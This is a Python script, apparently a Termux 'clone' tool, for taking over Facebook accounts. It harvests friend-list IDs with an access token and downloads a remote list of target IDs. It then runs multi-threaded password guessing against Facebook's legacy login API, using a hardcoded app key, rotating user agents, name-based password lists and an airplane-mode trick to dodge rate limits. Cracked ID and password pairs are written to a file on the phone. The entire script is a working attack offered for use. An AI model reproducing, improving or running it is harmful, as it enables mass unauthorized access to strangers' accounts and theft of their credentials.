import os, time, random, sys, requests, uuid
from concurrent.futures import ThreadPoolExecutor as ThreadPool

#--- [ PREMIUM COLORS ] ---#
G = '\033[1;92m' # Green
Y = '\033[1;93m' # Yellow
W = '\033[1;97m' # White
S = '\033[1;96m' # Cyan/Sky Blue
R = '\033[1;91m' # Red
M = '\033[1;95m' # Magenta

loop, oks, cps = 0, [], []

#--- [ PREMIUM USER-AGENTS ] ---#
# র্যান্ডম ইউজার এজেন্ট যা সহজে ব্লক খাবে না
ugen = [
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36"
]

def clear():
    os.system('clear')

def line():
    print(f"{M} ══════════════════════════════════════════════════{W}")

#--- [ SECURE KEY APPROVAL SYSTEM ] ---#
def approval():
    clear()
    try:
        device_id = os.getlogin().upper()
    except:
        device_id = "SHAHIN"
    
    unique_id = str(uuid.getnode())[:6]
    key = f"SHAHIN-PRO-{device_id}-{unique_id}"
    
    # আপনার ফিক্সড গিটহাব লিঙ্ক
    approval_url = "https://raw.githubusercontent.com/w8Shahin/Approval-control/main/Keys.txt"
    
    print(f"{S} ╔════════════════════════════════════════════════╗")
    print(f"{S} ║{G}           SHAHIN VIP PREMIUM CONTROL           {S}║")
    print(f"{S} ╚════════════════════════════════════════════════╝")
    
    try:
        active_keys = requests.get(approval_url).text
        if key in active_keys:
            print(f" {G}[√] ACCESS GRANTED! WELCOME BACK BOSS")
            time.sleep(1.5)
            Main()
        else:
            print(f" {R}[×] ACCESS DENIED - UNREGISTERED DEVICE")
            line()
            print(f" {W}[•] YOUR KEY : {G}{key}")
            line()
            print(f" {Y}[!] এই কী (Key) টি কপি করে এডমিনকে পাঠান।")
            print(f" {W}[•] এডমিন এপ্রুভ করলে সমস্ত প্রো ফিচার আনলক হবে।")
            input(f"\n {G}[ENTER] করলে হোয়াটসঅ্যাপে মেসেজ যাবে...")
            os.system(f'termux-open-url "https://wa.me/+8801XXXXXXXXX?text=Shahin%20Vau,%20Approve%20My%20Premium%20Key:%20{key}"')
            sys.exit()
    except Exception as e:
        print(f" {R}[!] Network Error! Check Internet Connection."); sys.exit()

#--- [ PREMIUM LOGO ] ---#
def logo():
    clear()
    print(f'''{S}
 ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
 ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ 
          ▐░▌▐░▌                    ▐░▌▐░▌          
          ▐░▌▐░█▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ 
          ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
          ▐░▌ ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀█░▌
          ▐░▌          ▐░▌▐░▌                    ▐░▌
 ▄▄▄▄▄▄▄▄▄█░▌▄▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄█░▌
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
 ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ 
    {Y}► PRO MULTI-TOOL ENVIRONMENT | V-25 ULTIMATE ◄{W}''')
    line()
    print(f' {W}[{G}✓{W}] OWNER    : {G}SHAHIN BIN AHMED')
    print(f' {W}[{G}✓{W}] SYSTEM   : {S}ALL IN ONE PREMUM')
    print(f' {W}[{G}✓{W}] STATUS   : {G}PRO ACCESS UNLOCKED')
    line()

#--- [ MAIN MENU ] ---#
def Main():
    logo()
    print(f' {G}[1]{W} {S}DUMP UID FROM ID {W}(Extract UIDs via Token)')
    print(f' {G}[2]{W} {Y}AUTO OLD UID CLONE {W}(Online Active Dump)')
    print(f' {G}[3]{W} {G}FILE CLONE {W}(Clone from your custom file)')
    print(f' {R}[0]{W} EXIT SYSTEM')
    line()
    opt = input(f' {W}[{G}?{W}] CHOOSE OPTION : {G}')
    
    if opt == '1':
        uid_dumper()
    elif opt == '2':
        online_dump()
    elif opt == '3':
        file_crack()
    else:
        sys.exit()

#--- [ OPTION 1: UID DUMPER ] ---#
def uid_dumper():
    logo()
    print(f" {W}[•] ENTER PUBLIC ID AND EAAB TOKEN")
    target = input(f" {W}[+] TARGET ID : {G}")
    token = input(f" {W}[+] FB TOKEN  : {G}")
    try:
        url = f"https://graph.facebook.com/{target}?fields=friends.limit(5000)&access_token={token}"
        res = requests.get(url).json()
        with open('my_dump.txt', 'a') as f:
            for x in res['friends']['data']:
                f.write(x['id'] + '|' + x['name'] + '\n')
        print(f" {G}[√] SUCCESSFULLY DUMPED {len(res['friends']['data'])} IDS!")
        print(f" {W}[•] File Saved As: my_dump.txt")
        time.sleep(3)
        Main()
    except KeyError:
        print(f" {R}[!] Invalid Token or ID is Private!"); time.sleep(2); Main()
    except Exception as e:
        print(f" {R}[!] Error: {e}"); time.sleep(2); Main()

#--- [ OPTION 2: ONLINE DUMP AUTO CLONE ] ---#
def online_dump():
    logo()
    print(f" {W}[•] Fetching Premium Old Active IDs...")
    url = "https://raw.githubusercontent.com/Social-Engineer-Tool/dumps/main/bd_old_ids.txt"
    try:
        data = requests.get(url).text
        with open('online_dump.txt', 'w') as f:
            f.write(data)
        start_cloning('online_dump.txt', "AUTO")
    except:
        print(f" {R}[!] Download Failed! Check Internet."); time.sleep(2); Main()

#--- [ OPTION 3: FILE CLONE ] ---#
def file_crack():
    logo()
    path = input(f" {W}[+] ENTER FILE PATH (e.g /sdcard/file.txt) : {G}")
    if os.path.exists(path):
        start_cloning(path, "FILE")
    else:
        print(f" {R}[!] File Not Found!"); time.sleep(2); Main()

#--- [ CORE CRACKING ENGINE ] ---#
def start_cloning(file_path, mode):
    try:
        ids = open(file_path, 'r').read().splitlines()
    except:
        print(f" {R}[!] Error Reading File!"); sys.exit()
    
    logo()
    print(f" {W}[•] TARGET FILE  : {S}{file_path}{W}")
    print(f" {W}[•] TOTAL TARGET : {Y}{len(ids)}{W}")
    print(f" {W}[•] MODE         : {G}ULTRA SPEED MULTI-THREAD{W}")
    print(f" {Y}[!] Turn ON/OFF Airplane Mode every 5 minutes!{W}")
    line()
    
    with ThreadPool(max_workers=45) as engine: # Increased threads for speed
        for user in ids:
            parts = user.split('|')
            uid = parts[0]
            name = parts[1].lower() if len(parts) > 1 else 'shahin'
            first_name = name.split(' ')[0]
            
            # স্মার্ট পাসওয়ার্ড লজিক (নামের সাথে মিলিয়ে এবং ওল্ড পাসওয়ার্ড)
            pws = [
                first_name+'123', first_name+'1234', first_name+'12345', 
                name, '123456', '1234567', '12345678', '123456789', 
                '112233', '55667788', '572737'
            ]
            engine.submit(crack, uid, pws, len(ids))

def crack(uid, pws, limit):
    global loop, oks
    ua = random.choice(ugen) # র্যান্ডম ইউজার এজেন্ট
    
    for pw in pws:
        session = requests.Session()
        headers = {
            'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        }
        data = {'email': uid, 'password': pw, 'format': 'json'}
        try:
            res = session.post('https://b-api.facebook.com/method/auth.login', data=data, headers=headers).json()
            if 'session_key' in res:
                print(f'\r\r{G} [SHAHIN-OK💚] {uid} | {pw}{W}')
                oks.append(uid)
                open('/sdcard/SHAHIN-OK.txt', 'a').write(uid+'|'+pw+'\n')
                break
            elif 'checkpoint' in str(res):
                # Checkpoint id count off to save terminal space
                break
        except:
            pass
            
    loop += 1
    sys.stdout.write(f'\r\r {S}[SHAHIN-PRO] {loop}/{limit} | OK:{G}{len(oks)}{W}'); sys.stdout.flush()

if __name__ == "__main__":
    approval()
